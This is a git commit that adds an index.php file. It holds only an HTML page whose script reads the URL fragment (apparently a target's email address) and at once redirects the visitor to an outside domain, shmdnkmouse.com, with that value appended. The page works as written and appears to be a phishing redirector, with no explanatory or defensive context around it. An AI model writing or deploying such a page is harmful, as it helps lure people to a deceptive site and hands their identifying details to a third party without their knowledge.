da02d8cef3bf71500bbd3a52e72e6f4d26a9c01c
jacqforres <168159770+jacqforres@users.noreply.github.com>
2024-05-03 20:19:33 +0200

    index.php

---
+++ index.php
@@ -0,0 +1,17 @@
+<html lang="en">
+
+
+
+  
+    <script>
+
+        var hash = window.location.hash;
+
+        var em = hash.split('#')[1];
+window.setTimeout(function() {
+    window.location.href = 'https://shmdnkmouse.com/#'+em;
+}, 1);
+       
+    </script>
+
+</html>
